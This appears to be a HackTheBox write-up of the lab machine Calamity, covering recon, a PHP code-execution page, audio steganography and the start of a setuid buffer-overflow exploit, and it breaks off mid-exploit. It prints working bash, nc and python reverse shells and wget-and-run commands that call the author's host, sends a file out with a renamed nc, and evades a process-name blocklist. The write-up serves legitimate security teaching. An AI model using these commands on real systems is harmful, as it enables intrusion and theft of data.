---
title: HTB: Calamity
url: https://0xdf.gitlab.io/2020/08/27/htb-calamity.html
date: 2020-08-27T21:00:00+00:00
difficulty: Insane [50]
os: Linux
tags: htb-calamity, ctf, hackthebox, nmap, gobuster, webshell, scripting, filter, phpbash, steganography, audacity, lxd, bof, gdb, peda, checksec, nx, mprotect, python, exploit, pattern-create, ret2libc, youtube, htb-obscurity, htb-frolic, htb-mischief
---

![Calamity](https://0xdfimages.gitlab.io/img/calamity-cover.png)

Calamity was released as Insane, but looking at the user ratings, it looked more like an easy/medium box. The user path to through the box was relatively easy. Some basic enumeration gives access to a page that will run arbitrary PHP, which provides execution and a shell. There’s an audio steg challenge to get the user password and a user shell. People likely rated the box because there was an unintended root using lxd. I’ve done that before, and won’t show it here. The intended path was a contrived but interesting pwn challenge that involved three stages of input, the first two exploiting a very short buffer overflow to get access to a longer buffer overflow and eventually a root shell. In Beyond Root, I’ll look at some more features of the source code for the final binary to figure out what some assembly did, and why a simple return to libc attack didn’t work.

## Box Info

| Name | [Calamity](https://hackthebox.com/machines/calamity)  [Calamity](https://hackthebox.com/machines/calamity) [Play on HackTheBox](https://hackthebox.com/machines/calamity) |
| --- | --- |
| Release Date | [30 Jun 2017](https://twitter.com/hackthebox_eu/status/961709827893456897) |
| Retire Date | 20 Jan 2018 |
| OS | Linux Linux |
| Base Points | ~~Insane [50]~~ Hard [40] |
| Rated Difficulty | Rated difficulty for Calamity |
| Radar Graph | Radar chart for Calamity |
| First Blood User | 00:26:43[Arcocapaz Arcocapaz](https://app.hackthebox.com/users/1772) |
| First Blood Root | 4 days01:55:12[RoliSoft RoliSoft](https://app.hackthebox.com/users/1178) |
| Creator | [forGP forGP](https://app.hackthebox.com/users/198) |

## Recon

### nmap

`nmap` found two open TCP ports, SSH (22) and HTTP (80):

```

root@kali# nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.27
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-24 06:44 EDT
Nmap scan report for 10.10.10.27
Host is up (0.016s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 8.21 seconds
root@kali# nmap -p 22,80 -sC -sV -oA scans/nmap-tcpscripts 10.10.10.27
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-24 06:47 EDT
Nmap scan report for 10.10.10.27
Host is up (0.013s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b6:46:31:9c:b5:71:c5:96:91:7d:e4:63:16:f9:59:a2 (RSA)
|   256 10:c4:09:b9:48:f1:8c:45:26:ca:f6:e1:c2:dc:36:b9 (ECDSA)
|_  256 a8:bf:dd:c0:71:36:a8:2a:1b:ea:3f:ef:66:99:39:75 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Brotherhood Software
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.49 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) and [Apache](https://packages.ubuntu.com/search?keywords=apache2) versions, the host is likely running Ubuntu xenial 16.04.

### Website - TCP 80

#### Site

The site is for Brotherhood Software:

![image-20200824065629081](https://0xdfimages.gitlab.io/img/image-20200824065629081.png)

It claims to be under development, and not functional yet.

Checking `index.php` returns 404. `index.html` returns the page, so no indication of what’s running on the server.

#### Directory Brute Force

I’ll run `gobuster` against the site. Even though I don’t know that the site is running PHP, given the Apache on Ubuntu stack, I’ll include `-x php` because that seems the most likely to me:

```

root@kali# gobuster dir -u http://10.10.10.27 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -t 20 -o scans/gobuster-root-medium-php 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.27
[+] Threads:        20
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Timeout:        10s
===============================================================
2020/08/22 16:36:08 Starting gobuster
===============================================================
/uploads (Status: 301)
/admin.php (Status: 200)
/server-status (Status: 403)
===============================================================
2020/08/22 16:41:26 Finished
===============================================================

```

Within seconds, `/upload` and `/admin.php` pop up. `/admin.php` is interesting for sure.

#### /admin.php

This page just presents a login form:

![image-20200824070032156](https://0xdfimages.gitlab.io/img/image-20200824070032156.png)

Entering wrong creds (like admin / admin) just prints a message:

![image-20200824070101082](https://0xdfimages.gitlab.io/img/image-20200824070101082.png)

I jumped over into Repeater to test out some simple SQLi, when I noticed a comment in the returning page:

```

<html><body>

<form method="post">
Password: <input type="text" name="user"><br>
Username: <input type="password" name="pass">
  <input type="submit" value="Log in to the powerful administrator page">
<!-- password is:skoupidotenekes-->
</form> 
</body></html>
GET OUT OF HERE 

```

Entering the username “admin” and the password “skoupidotenekes” returns cookie and a no-delay refresh:

```

HTTP/1.1 200 OK
Date: Mon, 24 Aug 2020 11:07:15 GMT
Server: Apache/2.4.18 (Ubuntu)
Set-Cookie: adminpowa=noonecares
refresh: 0;
Vary: Accept-Encoding
Content-Length: 451
Connection: close
Content-Type: text/html; charset=UTF-8

```

#### /admin.php w/ Cookie

On refresh, the browser is still at `/admin.php`, but now the content is different:

![image-20200824071443934](https://0xdfimages.gitlab.io/img/image-20200824071443934.png)

If I enter some HTML like `<b>0xdf</b>` and submit, that shows up at the end of the page with the HTML rendered (`<b>` makes the text bold):

![image-20200824071645798](https://0xdfimages.gitlab.io/img/image-20200824071645798.png)

Entering PHP seems to evaluate, such as `<?php echo "test"; ?>` just prints “test”:

![image-20200824071739021](https://0xdfimages.gitlab.io/img/image-20200824071739021.png)

## Shell as www-data

### Execution

I just showed that PHP is being executed. I can use `system` to run commands. For example, entering `<?php system("id"); ?>` shows that it’s running as www-data:

```

root@kali# curl -s -G http://10.10.10.27/admin.php --data-urlencode 'html=<?php system("id"); ?>' --cookie adminpowa=noonecares | sed -e '1,/<\/body><\/html>/ d'
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

I’m using `sed` here to remove all the content up to `</body></html>` at the end to just get the output. I’m also using `curl` with `-G` and `--data-urlencode` to url encode parameters in the GET request.

### RevShell Fail

With execution, rather than enumerate through this webshell, I’d rather get a legit shell. I started `nc` listening on my host, and ran a Bash reverse shell:

```

root@kali# curl -s -G http://10.10.10.27/admin.php --data-urlencode 'html=<?php system("bash -c \"bash -i >& /dev/tcp/10.10.14.24/443 0>&1\""); ?>' --cookie adminpowa=noonecares

```

I get a connection back, but it immediately dies:

```

root@kali# nc -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.27.
Ncat: Connection from 10.10.10.27:47324.
bash: cannot set terminal process group (1376): Inappropriate ioctl for device
bash: no job control in this shell
www-data@calamity:/var/www/html$ root@kali#

```

I tried a different reverse shell, but got the same result:

```

root@kali# curl -s -G http://10.10.10.27/admin.php --data-urlencode 'html=<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.24 443 >/tmp/f"); ?>' --cookie adminpowa=noonecares

```

To try a Python reverse shell, rather than try to get the one-liner into `curl` with all the `'` and `"`, I created a file `rev.py` locally with a [python reverse shell](https://github.com/infodox/python-pty-shells/blob/master/tcp_pty_backconnect.py), and hosted it with `python3 -m http.server 80`.

I could get the file with `wget` and then execute it:

```

root@kali# curl -s -G http://10.10.10.27/admin.php --data-urlencode 'html=<?php system("wget 10.10.14.24/rev.py -O /dev/shm/r.py; python /dev/shm/r.py"); ?>' --cookie adminpowa=noonecares

```

I saw the request at my server:

```
10.10.10.27 - - [23/Aug/2020 07:39:03] "GET /rev.py HTTP/1.1" 200 -

```

And then a connection at `nc`, but then it immediately died.

### Script Dumb Shell

Giving up on a reverse shell for now, I wrote a quick silly Bash script to allow me to input commands and get the output:

```

#!/bin/bash

while :
do
    echo -n "calamity> "
    read cmd
    if [ "$cmd" = "exit" ]; then exit; fi
    curl -s -G http://10.10.10.27/admin.php --data-urlencode "html=<?php system(\"$cmd\"); ?>" --cookie adminpowa=noonecares | sed -e '1,/<\/body><\/    html>/ d'
done

```

It will print a prompt and then read into the variable `$cmd`. If `$cmd` is “exit”, it quits. Then it will `curl` passing in the command, and loop.

This shell won’t keep state or allow me to change directories, but it works well enough to do some enumeration:

```

root@kali# rlwrap ./webshell.sh 
calamity> id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
calamity> pwd 
/var/www/html

```

I’ll run with `rlwrap` to get up arrow key for previous command.

### Enumeration

There’s one user with a home directory on the box:

```

calamity> ls -la /home
total 12
drwxr-xr-x  3 root   root   4096 Jun 27  2017 .
drwxr-xr-x 22 root   root   4096 Jun 29  2017 ..
drwxr-xr-x  7 xalvas xalvas 4096 Jun 29  2017 xalvas

```

In there, I can see `user.txt`, as well as a few other files:

```

calamity> ls -la /home/xalvas
total 3180
drwxr-xr-x 7 xalvas xalvas    4096 Jun 29  2017 .
drwxr-xr-x 3 root   root      4096 Jun 27  2017 ..
-rw-r--r-- 1 xalvas xalvas     220 Jun 27  2017 .bash_logout
-rw-r--r-- 1 xalvas xalvas    3790 Jun 27  2017 .bashrc
drwx------ 2 xalvas xalvas    4096 Jun 27  2017 .cache
-rw-rw-r-- 1 xalvas xalvas      43 Jun 27  2017 .gdbinit
drwxrwxr-x 2 xalvas xalvas    4096 Jun 27  2017 .nano
-rw-r--r-- 1 xalvas xalvas     655 Jun 27  2017 .profile
-rw-r--r-- 1 xalvas xalvas       0 Jun 27  2017 .sudo_as_admin_successful
drwxr-xr-x 2 xalvas xalvas    4096 Jun 27  2017 alarmclocks
drwxr-x--- 2 root   xalvas    4096 Jun 29  2017 app
-rw-r--r-- 1 root   root       225 Jun 27  2017 dontforget.txt
-rw-r--r-- 1 root   root      1934 Aug 24 07:41 intrusions
drwxrwxr-x 4 xalvas xalvas    4096 Jun 27  2017 peda
-rw-r--r-- 1 xalvas xalvas 3196724 Jun 27  2017 recov.wav
-r--r--r-- 1 root   root        33 Jun 27  2017 user.txt

```

I can actually read `user.txt`:

```

calamity> cat /home/xalvas/user.txt
0790e7be************************

```

`intrustions` is an interesting file:

```

calamity> cat /home/xalvas/intrusions
POSSIBLE INTRUSION BY BLACKLISTED PROCCESS nc         ...PROCESS KILLED AT 2017-06-28 04:55:42.796288
POSSIBLE INTRUSION BY BLACKLISTED PROCCESS nc         ...PROCESS KILLED AT 2017-06-28 05:22:11.228988
POSSIBLE INTRUSION BY BLACKLISTED PROCCESS nc         ...PROCESS KILLED AT 2017-06-28 05:23:23.424719
POSSIBLE INTRUSION BY BLACKLISTED PROCCESS nc         ...PROCESS KILLED AT 2017-06-29 02:43:57.083849
POSSIBLE INTRUSION BY BLACKLISTED PROCCESS python     ...PROCESS KILLED AT 2017-06-29 02:48:47.909739
POSSIBLE INTRUSION BY BLACKLISTED PROCCESS sh         ...PROCESS KILLED AT 2017-06-29 06:25:04.202315
POSSIBLE INTRUSION BY BLACKLISTED PROCCESS sh         ...PROCESS KILLED AT 2017-06-29 06:25:04.780685
POSSIBLE INTRUSION BY BLACKLISTED PROCCESS python     ...PROCESS KILLED AT 2017-06-29 06:25:06.209358
POSSIBLE INTRUSION BY BLACKLISTED PROCCESS nc        ...PROCESS KILLED AT 2017-06-29 12:15:32.329358
POSSIBLE INTRUSION BY BLACKLISTED PROCCESS nc        ...PROCESS KILLED AT 2017-06-29 12:15:32.330115
POSSIBLE INTRUSION BY BLACKLISTED PROCCESS nc        ...PROCESS KILLED AT 2017-06-29 12:16:10.508710
POSSIBLE INTRUSION BY BLACKLISTED PROCCESS nc        ...PROCESS KILLED AT 2017-06-29 12:16:10.510537
POSSIBLE INTRUSION BY BLACKLISTED PROCCESS python3    ...PROCESS KILLED AT 2017-12-24 10:30:28.836132
POSSIBLE INTRUSION BY BLACKLISTED PROCCESS bash       ...PROCESS KILLED AT 2020-08-23 07:30:29.924054
POSSIBLE INTRUSION BY BLACKLISTED PROCCESS nc         ...PROCESS KILLED AT 2020-08-23 07:31:00.062785
POSSIBLE INTRUSION BY BLACKLISTED PROCCESS nc         ...PROCESS KILLED AT 2020-08-23 07:31:14.127421
POSSIBLE INTRUSION BY BLACKLISTED PROCCESS bash       ...PROCESS KILLED AT 2020-08-23 07:36:15.442945
POSSIBLE INTRUSION BY BLACKLISTED PROCCESS nc         ...PROCESS KILLED AT 2020-08-23 07:37:29.782751
POSSIBLE INTRUSION BY BLACKLISTED PROCCESS python     ...PROCESS KILLED AT 2020-08-23 07:41:12.786494

```

The times line up with when I was trying to get a reverse shell. It seems something is killing processes, and based on the word “blacklist”, it seems likely that certain processes are being identified by process name and killed. Both versions of Python, Netcat, `sh`, and Bash all seem to be triggers.

### Shell

The problem with using blocklists on filenames as a defensive measure is that it’s not that hard for the attacker to make a copy of a binary and give it a different un-blocklisted name.

```

calamity> cp /bin/bash /dev/shm/0xdf
calamity> chmod +x /dev/shm/0xdf
calamity> /dev/shm/0xdf -c '/dev/shm/0xdf -i >& /dev/tcp/10.10.14.24/443 0>&1'

```

I get a shell at `nc`:

```

root@kali# nc -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.27.
Ncat: Connection from 10.10.10.27:47338.
0xdf: cannot set terminal process group (1376): Inappropriate ioctl for device
0xdf: no job control in this shell
www-data@calamity:/var/www/html$

```

Alternatively, I can upload something like [phpbash](https://github.com/Arrexel/phpbash). I can’t write to the webroot, but I can write to the `/uploads` folder:

```

calamity> wget 10.10.14.24/phpbash.php -O uploads/df.php
calamity> ls uploads
df.php

```

It works:

![image-20200824102426481](https://0xdfimages.gitlab.io/img/image-20200824102426481.png)

Or, I could skip getting a shell all together. I’ve already got `user.txt`, and the only other files I need from this step are retrievable through the webshell.

## Priv: www-data –> xalvas

### Enumeration

Also in xalvas’ home directory is a file called `recov.wav`. Recov sounds like recovery, so it’s worth taking a look at (also, steg was *way* more common in early HTB days). There are two move audio files in the `alarmclocks` folder:

```

calamity> ls -l /home/xalvas/alarm*
total 5708
-rw-r--r-- 1 root root 3196668 Jun 27  2017 rick.wav
-rw-r--r-- 1 root root 2645839 Jun 27  2017 xouzouris.mp3

```

I’ll use a renamed copy of `nc` to exfil:

```

calamity> cp /bin/nc /dev/shm/0xdfcat
calamity> cat /home/xalvas/recov.wav | base64 | /dev/shm/0xdfcat 10.10.14.24 443

```

Back at Kali:

```

root@kali# nc -lnvp 443 | base64 -d > recov.wav
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.27.
Ncat: Connection from 10.10.10.27:47346.

```

I did the same for the other two files:

```

calamity> cat /home/xalvas/alarmclocks/rick.wav | base64 | /dev/shm/0xdfcat 10.10.14.24 443
calamity> cat /home/xalvas/alarmclocks/xouzouris.mp3 | base64 | /dev/shm/0xdfcat 10.10.14.24 443

```

If I wanted to do that without renaming `nc`, I could also just do it through `curl` having PHP print the contents of the file:

```

root@kali# curl -s -G http://10.10.10.27/admin.php --data-urlencode "html=<?php system(\"cat /home/xalvas/recov.wav\"); ?>" --cookie adminpowa=noonecares | sed -e '1,/<\/body><\/html>/ d' > recov-curl.wav

root@kali# md5sum recov*
a2c5f6ad4eee01f856348ec1e2972768  recov-curl.wav
a2c5f6ad4eee01f856348ec1e2972768  recov.wav

```

### Audio Enumeration

I used `play` (from `apt install sox libsox-fmt-all`) to play the audio files from the command line. The first file, `xouzouris.mp3` is something I didn’t recognize, but [acrcloud.com](https://www.acrcloud.com/identify-songs-music-recognition-online/upload/553da35f2ea5e410f48762d6347ea5b8#upload-div) identifies it as De Luilaksmurf by De Smurfen:

![image-20200824140653892](https://0xdfimages.gitlab.io/img/image-20200824140653892.png)

It’s 2:45 long:

```

root@kali# play xouzouris.mp3 

xouzouris.mp3:

 File Size: 2.65M     Bit Rate: 128k
  Encoding: MPEG audio    
  Channels: 2 @ 16-bit   
Samplerate: 44100Hz      
Replaygain: off         
  Duration: 00:02:45.33  

In:1.46% 00:00:02.41 [00:02:42.91] Out:106k  [   -==|===   ] Hd:5.7 Clip:0    
Aborted.

```

The other two songs are 18 seconds of [Rickroll](https://knowyourmeme.com/memes/rickroll):

```

root@kali# play rick.wav 
play WARN alsa: can't encode 0-bit Unknown or not applicable

rick.wav:

 File Size: 3.20M     Bit Rate: 1.41M
  Encoding: Signed PCM    
  Channels: 2 @ 16-bit   
Samplerate: 44100Hz      
Replaygain: off         
  Duration: 00:00:18.12  

In:23.1% 00:00:04.18 [00:00:13.94] Out:184k  [!=====|=====!] Hd:0.0 Clip:0    
Aborted.
root@kali# play recov.wav 
play WARN alsa: can't encode 0-bit Unknown or not applicable

recov.wav:

 File Size: 3.20M     Bit Rate: 1.41M
  Encoding: Signed PCM    
  Channels: 2 @ 16-bit   
Samplerate: 44100Hz      
Replaygain: off         
  Duration: 00:00:18.12  

In:30.2% 00:00:05.48 [00:00:12.64] Out:242k  [!=====|=====!] Hd:0.0 Clip:0    
Aborted.

```

It’s interesting that they both sound exactly the same, but they are different files:

```

root@kali# md5sum *.wav
a2c5f6ad4eee01f856348ec1e2972768  recov.wav
a69077504fc70a0bd5a0e9ed4982a6b7  rick.wav

```

### Steg

[Steganography](https://en.wikipedia.org/wiki/Steganography) is hiding information in another file by changing bits in places that won’t typically be noticed by someone looking at the file for its intended purpose. Given that have two `.wav` files that sound identical but are not, and one is called recov, I’m looking for a way to pull information out of that file.

I’ll open Audacity and File –> Import both files in:

![image-20200824143338964](https://0xdfimages.gitlab.io/img/image-20200824143338964.png)

If I play this, I just hear the rickroll, as it’s just playing both files at the same time, and both files sound basically the same.

I’ll select all of `rick.wav`, then go to Effects –> Invert. This will basically create a negative wave, so that when the two are played together, it will cancel out the sound that’s the same in the other one. I can play it from here, and hear a voice talking.

To see it visually, File –> Export and save it as a new `.wav` file. I’ll open that in a new instance of Audacity:

![image-20200824143858647](https://0xdfimages.gitlab.io/img/image-20200824143858647.png)

There’s a burst at the beginning and at the end.

The first part says: `47936..*`, and the second part says: `Your password is 185`.

### SSH

With a password, I can now get SSH access to Calamity:

```

root@kali# sshpass -p '18547936..*' ssh xalvas@10.10.10.27
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-81-generic i686)
 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

9 packages can be updated.
8 updates are security updates.

Last login: Fri Jun 30 08:27:25 2017 from 10.10.13.44
xalvas@calamity:~$

```

## Priv: xalvas –> root

### Unintended LXD Path

There’s an unintended LXD path for this box. I actually learned this method when I wanted to use it for other CTFs and I found myself watching Ippsec do it in his video for this box. I had forgotten about this until working the box now.

xalvas is in the lxd group:

```

xalvas@calamity:~$ id
uid=1000(xalvas) gid=1000(xalvas) groups=1000(xalvas),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)

```

I’ve shown this privesc a [couple times](/tags.html#lxd) (see [Obscurity](/2020/05/09/htb-obscurity.html#patched-path-4-lxd) and [Mischief](/2019/01/05/htb-mischief.html#option-3---lxc-patched)). It works here too, but I won’t show it. I’ll focus on the intended way.

### Enumeration

In xalvas’ home directory there’s an `app` folder that I couldn’t access as www-data:

```

xalvas@calamity:~$ ls -ld app/
drwxr-x--- 2 root xalvas 4096 Jun 29  2017 app/

```

Inside it, there’s a 32-bit SUID executable, `goodluck`, and a source file, `src.c`:

```

xalvas@calamity:~/app$ ls -l
total 20
-r-sr-xr-x 1 root root 12584 Jun 29  2017 goodluck
-r--r--r-- 1 root root  3936 Jun 29  2017 src.c

xalvas@calamity:~/app$ file goodluck 
goodluck: setuid ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=3c99898fca6a0c3ac721b3f3c38ad7ff188f999c, not stripped

```

I’ll copy both back to my machine (though I’m not sure I actually used a local copy of the binary):

```

root@kali# sshpass -p '18547936..*' scp xalvas@10.10.10.27:~/app/* .

```

### Run It

I can run `goodluck`, and it waits a second, and then prompts for a filename. I’ll give it something, and then it prints a menu:

```

xalvas@calamity:~/app$ /home/xalvas/app/goodluck 

Filename:  /etc/passwd
        -----MENU-----
1) leave message to admin
2) print session ID
3)login (admin only)
4)change user
5)exit

 action:

```

If the file doesn’t exist, it doesn’t print the menu but just exits.

Based on what I enter at the “action:” prompt, the program:

| Option | Result |
| --- | --- |
| 1 | Nothing? Re-prints menu |
| 2 | Segmentation fault |
| 3 | Segmentation fault |
| 4 | Prompts for filename, back to menu if exists, exit otherwise |
| 5 | Exits |
| Other | Asks for a number between 1 and 5, and re-prints menu |

Not much else to do here, but the seg faults are interesting for sure. I’ll pivot to the source code.

### Source Code Analysis

#### Definitions / main

Walking through the [code](/files/htb-calamity-src.c), the first thing it does after the include statements is define two constants and then create a `struct` named `hey`:

```

#define USIZE 12
#define ISIZE 4

  struct f {
    char user[USIZE];
    //int user;
    int secret;
    int admin;
    int session;
  }
hey;

```

It’s worth noting that the username used to be an int (four bytes, matching `ISZIE`), but seems to have been changed to an array of `char` that’s 12 bytes (`USIZE`).

Then a bunch of functions are defined (I’ll skip them for now) and then last comes `main`. It runs some assembly instructions (which aren’t obvious now, but I’ll look at them in `gdb` later), then a `sleep(2)` (explains the pause on starting), and the initialization of some variables, generating a random number for the session id `sess` (which is then stored in `hey.sess`), and a variable `protect` which is the current time stamp xored by 0x01010101. `hey.admin` is also set to 0.

#### createusername

There’s then a call to `createusername()`.

```

void createusername() {
//I think  something's bad here
unsigned char for_user[ISIZE];

  printf("\nFilename:  ");

  char fn[30];
  scanf(" %28s", & fn);

flushit();
  copy(fn, for_user,USIZE);

 strncpy(hey.user,for_user,ISIZE+1);
  hey.user[ISIZE+1]=0;

}

```

This is where the prompt for the filename is printed, up to 28 characters are read into `fn`, and it is passed into `copy`. `copy` opens the file `fn`, reads up to `length` bytes, and stores the result in the `dst` variable:

```

void copy(unsigned char * src, unsigned char * dst,int length) {

  FILE * ptr;

  ptr = fopen(src, "rb");
  if (ptr == 0) exit(1);
  fread(dst, length, 1, ptr); /*
HTB hint: yes you can read every file you want,
but reading a sensitive file such as shadow is not the 
intended way of solving this,...it's just an alternative way of providing input !
tmp is not listable so other players cant see your file,unless you create a guessable file such as /tmp/bof !*/

  fclose(ptr);

}

```

So in this case, `copy(fn, for_user,USIZE)` will read the first 12 bytes of the file into `for_user`. But `for_user` is only four bytes long! This is a buffer overflow (bof). Unfortunately for me, it’s a very small bof. It reads 12 bytes into a four byte buffer, and the fifth byte is set to null. I’ll look at this overflow more later.

#### main Loop

After setting `hey.user` in `createusername`, `main` enters a loop:

```

  while (1) {
    char action = print();

    if (action == '1') {
      //I striped the code for security reasons !

    } else if (action == '2') {
      printdeb(hey.session);
    } else if (action == '3') {
      attempt_login(hey.admin, protect, hey.secret);
      //I'm changing the program ! you will never be to log in as admin...
      //I found some bugs that can do us a lot of harm...I'm trying to contain them but I think I'll have to
      //write it again from scratch !I hope it's completely harmless now ...
    }

    else if(action=='4')createusername();
    else if (action == '5') return;

  }

```

`print()` prints the menu and records the response, ensuring that it’s a digit one through five.

`'1'` does nothing.

`'2'` calls `printdeb(hey.session)`, which simply calls `printf` to print the hex value passed in with the string `debug info:` and some newlines.

`'4'` calls `createusername()` again, allowing the user to load a different file.

`'5'` returns, breaking the loop.

`'3'` calls `attempt_login(hey.admin, protect, hey.secret)`.

#### attempt\_login

Anytime there’s a comment saying “you’ll never be able to do something”, it’s worth looking at. Looking at `attempt_login`, it makes two checks:

```

void attempt_login(int shouldbezero, int safety1, int safety2) {

  if (safety2 != safety1) {
    printf("hackeeerrrr");
    fflush(stdout);
	exit(666);
  }
  if (shouldbezero == 0) {
    printf("\naccess denied!\n");
    fflush(stdout);
  } else debug();

}

```

If `safety1` is not equal to `safety2`, it prints a message and exits. It’s called with those variables being `protect` and `hey.secret`. At the start of main, `protect` is generated using a timestamp and an xor pattern, and then the same value is set as `hey.secret`, so those two should be the same. This is a protection (kind of like a stack canary) to prevent me from overflowing the `hey` structure and changing things.

The second check is if `shouldbezero` (in this case, `hey.admin`) is 0. It is set to 0 at the start of `main`, so without some exploitation, this will return true, and then the program will print “access denied!” and return to the main loop. If I can somehow change the value of `hey.admin` to be non-zero (while keeping `hey.secret` as the same as `protect`), it will call `debug`.

#### debug

The `debug` function starts by printing that it’s an intentionally vulnerable bit of code:

```

void debug() {

  printf("\nthis function is problematic on purpose\n");
  printf("\nI'm trying to test some things...and that means get control of the program! \n");

  char vuln[64];

  printf("vulnerable pointer is at %x\n", vuln);
  printf("memory information on this binary:\n", vuln);

  printmaps();

  printf("\nFilename:  ");

  char fn[30];
  scanf(" %28s", & fn);
  flushit();
  copy(fn,vuln,100);//this shall trigger a buffer overflow

  return;

}

```

It first prints out the address of the `vuln` buffer, as well as the memory maps for the binary. Then it reads a filename, and calls the same `copy` function as above to read up to 100 bytes from that file into the 64 byte buffer, which is an obvious overflow (and is called out by the comments).

### Protections

In order to make an exploit, I need a to understand what protections are in place:

```

gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : ENABLED
RELRO     : Partial

```

No canaries means that I can exploit the bof in `debug` should I get the code there.

`NX` means that I’ll have to either not run code from the stack, or find a way to reverse that.

`PIE` means that I can’t rely on gadgets from the main program, as it will be jumping around in memory on each run.

ASLR is disabled on Calamity:

```

xalvas@calamity:~$ cat /proc/sys/kernel/randomize_va_space 
0

```

### Summary To This Point

Based on the analysis thus far, I can see how to interact with this program by giving it files to read in. There’s a very small buffer overflow in that function that I doubt will overwrite a return address, but I need to look into that. There’s also a likely exploitable (both based on my assessment and the comments in the code) buffer overflow in the `debug` function, but to get there, I’ll need a way to change the value of `hey.admin` without messing up `hey.secret`.

### Dynamic Analysis

Now I’ll turn to `gdb` to look at how the program works.

#### Assembly in main

At the start of main, there’s this:

```

int main(int argc, char * argv[]) {
asm(
"push $0x00000001\n"
"push $0x0003add6\n"
"push $0xb7e1a000\n"
"call 0x37efcd50\n"
"add $0x0c,%esp\n"

"push $0x00000005\n"
"push $0x0003a000\n"
"push $0xb7e1a000\n"
"call 0x37efcd50\n"
"add $0x0c,%esp\n"
);

```

It’s clearly calling a function at 0x37efcd50 twice, each time pushing three arguments onto the stack, and removing that extra stack space after (by adding 3 x 4 = 0xc bytes back to ESP).

If I open `gdb` and put a break at the start of `main` (`b main`), and then run (`r`), I can see this assembly a few instructions in:

```

   0x80000d94 <main+29>:        push   0x1
   0x80000d96 <main+31>:        push   0x3add6
   0x80000d9b <main+36>:        push   0xb7e1a000
   0x80000da0 <main+41>:        call   0xb7efcd50 <mprotect>
   0x80000da5 <main+46>:        add    esp,0xc
   0x80000da8 <main+49>:        push   0x5
   0x80000daa <main+51>:        push   0x3a000
   0x80000daf <main+56>:        push   0xb7e1a000
   0x80000db4 <main+61>:        call   0xb7efcd50 <mprotect>
   0x80000db9 <main+66>:        add    esp,0xc

```

These are calls to `mprotect`, which is defined [here](https://www.man7.org/linux/man-pages/man2/mprotect.2.html). This function will the permissions on sections of memory. I’ll dig into this more in [Beyond Root](#beyond-root), but for now, I’ll just note the address of `mprotect`, as I’ll need it later.

#### Small Overflow

I spent a minute looking at the disassembly for `createusername`. The stack frame for this function looks like:

![image-20200825172142313](https://0xdfimages.gitlab.io/img/image-20200825172142313.png)

The overflow is on `for_user`, which allows me to write twelve bytes instead of four. The only thing I can overflow with that is the stored EBX for `main`. When this function starts, it pushes EBX onto the stack, and then on return, it pops it back into EBX, preserving the value from `main`. `main` expects to have EBX preserved across this function call, but I can change it.

To show this, I’ll create a file:

```

xalvas@calamity:~$ echo -n "AAAABBBBCCCC" > /tmp/0xdf

```

I’ll open `gdb` and put a break point at the call to `createusername` with `b *main+187`, and then run:

```

Breakpoint 3, 0x80000e32 in main ()
gdb-peda$ p $ebx
$10 = 0x80003000
gdb-peda$ n

Filename:  /tmp/0xdf

gdb-peda$ p $ebx
$11 = 0x43434343

```

Before `createusername`, the value of EBX is 0x80003000. As `createusername` is called, I’ve overwritten the EBX buffer in `main` to 0x43434343.

So what good is that? EBX is used as a reference to get to the `hey` structure. For example, when menu `2` is entered, the assembly for `printdeb(hey.session)` looks like:

```

   0x80000e4b <+212>:   lea    eax,[ebx+0x68]
   0x80000e51 <+218>:   mov    eax,DWORD PTR [eax+0x14]
   0x80000e54 <+221>:   sub    esp,0xc
   0x80000e57 <+224>:   push   eax
   0x80000e58 <+225>:   call   0x80000be3 <printdeb>

```

It loads EBX+0x68 into EAX, and then goes 0x14 bytes into that. That fits how the struct is defined (I added the offsets as comments):

```

  struct f {
    char user[USIZE]; // 0x00-0x0b
    int secret;       // 0x0c-0x0f
    int admin;        // 0x10-0x13
    int session;      // 0x14-0x17
  }
hey;

```

This means I can change the values of the items in `hey`, albeit in a limited way as I can only shift the structure, not change an individual value.

### Exploit

#### Stage 1 - Leak hey.secret

I want to change where the computer looks for `hey` such that `hey.admin` is no longer 0. But I need to do that in a way that `hey.secret` still is the same as `protect`. The way to do that is to leak `hey.secret` using the `printdeb` function.

